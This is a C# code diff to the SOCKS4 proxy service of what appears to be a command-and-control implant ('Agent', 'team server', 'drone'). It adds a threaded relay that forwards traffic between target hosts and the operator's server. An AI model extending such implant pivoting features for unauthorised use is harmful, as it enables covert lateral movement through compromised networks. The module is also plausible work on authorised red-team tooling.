@@ -12,9 +12,87 @@ using Agent.Helpers;
 using System.Net;
 using Shared;
 using BinarySerializer;
+using System.Threading;
+using System.IO;
 
 namespace Agent.Service
 {
+
+    public sealed class SocksClient
+    {
+        public string Id { get; private set; }
+
+        public Agent Agent { get; private set; }
+        private TcpClient _tcp;
+        private readonly ManualResetEvent _signal = new ManualResetEvent(false);
+        private ConcurrentQueue<byte[]> _dataQueue = new ConcurrentQueue<byte[]>();
+
+        public SocksClient(TcpClient client, string id, Agent agent)
+        {
+            this.Id = id;
+            this._tcp = client;
+            Agent=agent;   
+        }
+
+        public void QueueData(byte[] data)
+        {
+            _dataQueue.Enqueue(data);
+        }
+
+        public bool TryDequeue(out byte[] data)
+        {
+            return _dataQueue.TryDequeue(out data);
+        }
+
+        public void Disconnect()
+        {
+            try
+            {
+                this._tcp.Close();
+            }
+            finally { }
+        }
+
+        public bool DataAvailable()
+        {
+            return this._tcp.DataAvailable();
+        }
+
+        public bool IsConnected()
+        {
+            return this._tcp.Connected;
+        }
+
+        public async Task<byte[]> ReadStream()
+        {
+            var stream = this._tcp.GetStream();
+            const int bufSize = 1024;
+            int read;
+
+            using (var ms = new MemoryStream())
+            {
+                do
+                {
+                    var buf = new byte[bufSize];
+                    read = await stream.ReadAsync(buf, 0, bufSize);
+
+                    if (read == 0)
+                        break;
+
+                    await ms.WriteAsync(buf, 0, read);
+
+                } while (read >= bufSize);
+
+                return ms.ToArray();
+            }
+        }
+
+        public async Task WriteStream(byte[] data)
+        {
+            var stream = this._tcp.GetStream();
+            await stream.WriteAsync(data, 0, data.Length);
+        }
+    }
     internal interface IProxyService
     {
         Task HandleSocksPacket(Socks4Packet packet, Agent agent);
@@ -27,7 +105,7 @@ namespace Agent.Service
             _frameService = frameService;
         }
 
-        private readonly Dictionary<string, TcpClient> _socksClients = new Dictionary<string, TcpClient>();
+        private readonly Dictionary<string, SocksClient> _socksClients = new Dictionary<string, SocksClient>();
         public async Task HandleSocksPacket(Socks4Packet packet, Agent agent)
         {
             switch (packet.Type)
@@ -43,7 +121,6 @@ namespace Agent.Service
                         {
                             DisconnectSocksClient(packet.Id);
                         }
-                        
 
                         break;
                     }
@@ -85,7 +162,7 @@ namespace Agent.Service
             {
                 await client.ConnectAsync(target, request.DestinationPort);
             }
-            catch(SocketException ex)
+            catch (SocketException ex)
             {
                 var p = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT, false.BinarySerializeAsync().Result);
                 var f = this._frameService.CreateFrame(agent.MetaData.Id, NetFrameType.Socks, p);
@@ -95,46 +172,91 @@ namespace Agent.Service
 
             if (_socksClients.ContainsKey(request.Id))
             {
-                _socksClients[request.Id].Dispose();
+                _socksClients[request.Id].Disconnect();
                 _socksClients.Remove(request.Id);
             }
 
-            _socksClients.Add(request.Id, client);
+            var sockClient = new SocksClient(client, request.Id, agent);
+            _socksClients.Add(request.Id, sockClient);
 
             // send packet back in acknowledgement
             var packet = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT, true.BinarySerializeAsync().Result);
             var frame = this._frameService.CreateFrame(agent.MetaData.Id, NetFrameType.Socks, packet);
             await agent.SendFrame(frame);
+
+            var thread = new Thread(HandleClient);
+            thread.Start(sockClient);
         }
+
+        private async void HandleClient(object obj)
+        {
+            if (!(obj is SocksClient))
+                return;
+
+            var client = (SocksClient)obj;
+
+            try
+            {
+                while (client.IsConnected())
+                {
+                    // if client has data
+                    if (client.DataAvailable())
+                    {
+                        // read it
+                        var data = await client.ReadStream();
+
+#if DEBUG
+                        Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data, Reponse [{data.Length}]");
+#endif
+
+                        // send back to team server
+                        var packet = new Socks4Packet(client.Id, Socks4Packet.PacketType.DATA, data);
+                        var frame = this._frameService.CreateFrame(client.Agent.MetaData.Id, NetFrameType.Socks, packet);
+                        await client.Agent.SendFrame(frame);
+                        // send to the drone
+                    }
+
+                    byte[] request;
+                    if (client.TryDequeue(out request))
+                    {
+                        await client.WriteStream(request);
+
+#if DEBUG
+                        Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data, Request [{request.Length}]");
+#endif
+
+                    }
+
+                    await Task.Delay(100);
+                }
+            }
+            catch { }
+
+            // send a disconnect
+#if DEBUG
+            Debug.WriteLine($"SOCKS [{client.Id}] : Handling Socks Data => Disconnect");
+#endif
+            var p = new Socks4Packet(client.Id, Socks4Packet.PacketType.DISCONNECT);
+            var f = this._frameService.CreateFrame(client.Agent.MetaData.Id, NetFrameType.Socks, p);
+            await client.Agent.SendFrame(f);
+        }
+
+
 
         private async Task HandleSocksData(Socks4Packet inbound, Agent agent)
         {
 #if DEBUG
-            Debug.WriteLine($"Handling Socks Data [{inbound.Data.Length}]");
+            Debug.WriteLine($"SOCKS [{inbound.Id}] : Handling Socks Data, Data [{inbound.Data.Length}]");
 #endif
             if (_socksClients.TryGetValue(inbound.Id, out var client))
             {
-                try
-                {
+
                     // write data
-                    await client.WriteClient(inbound.Data);
-
-                    // read response
-                    // this will block if there's no data?
-                    var response = await client.ReadClient();
-
-                    // send back to team server
-                    var packet = new Socks4Packet(inbound.Id, Socks4Packet.PacketType.DATA, response);
-                    var frame = this._frameService.CreateFrame(agent.MetaData.Id, NetFrameType.Socks, packet);
-                    await agent.SendFrame(frame);
+                    client.QueueData(inbound.Data);
 #if DEBUG
-                    Debug.WriteLine($"Handling Socks Data, Reponse sent [{packet.Data.Length}]");
+                    Debug.WriteLine($"SOCKS [{inbound.Id}] : Handling Socks Data, Enqueue [{inbound.Data.Length}]");
 #endif
-                }
-                catch
-                {
-                    // meh
-                }
+                
             }
         }
 
@@ -143,7 +265,7 @@ namespace Agent.Service
             if (!_socksClients.TryGetValue(id, out var client))
                 return;
 
-            client.Dispose();
+            client.Disconnect();
             _socksClients.Remove(id);
         }
         /*protected ConcurrentQueue<SocksMessage> _InboudMessages = new ConcurrentQueue<SocksMessage>();
